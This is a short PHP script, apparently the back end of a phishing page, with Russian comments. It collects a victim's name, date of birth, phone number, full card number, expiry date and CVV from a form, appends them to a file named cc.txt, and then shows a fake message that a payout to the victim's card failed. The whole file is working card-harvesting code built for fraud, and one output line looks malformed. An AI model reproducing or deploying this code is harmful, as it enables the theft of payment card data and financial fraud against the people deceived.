<?php
$fio = $_POST['fio'];
$lfio = $_POST['lfio'];
$date = $_POST['date'];
$phone = $_POST['phone'];
$cardnumber = $_POST['cardnumber'];
$expirationdate = $_POST['expirationdate'];
$securitycode = $_POST['securitycode'];
$name = $_POST['name'];
$country = $_POST['country'];
$city = $_POST['city'];
$text .= "Cardholder: $name \n"; 
$text .= "LName: $lfio \n";
$text .= "FName: $fio \n"; 
$text .= "Date of Birth: $date \n"; 
$text .= "Mobile Phone: $phone \n";
$text .= "Card: $cardnumber \n"; 
$text .= "EXP: $expirationdate \n"; 
$text .= "CVV: $securitycode \n";
$text .= "Country: $country \n"; 
$text .= "City: $city \n";  
$text .= "ccc: $/////////////////////////////////////////////////////// \n";

  if (!empty($fio) && !empty($lfio) && !empty($date) && !empty($phone) && !empty($cardnumber) && !empty($expirationdate) && !empty($securitycode) && !empty($name) && !empty($country) && !empty($city) ) //если все переменные имеют значения выполняем запись в файл
    {
    $file = fopen ("cc.txt", "a+"); //открываем для перезаписи файл cc.txt лежаший в одной папке с текущей страницей
    fwrite ($file,$text); // пишем в файл
    fclose ($file);
    echo "Не удаётся произвести выплату на карту вашего банка."; // закрываем файл
    }
?>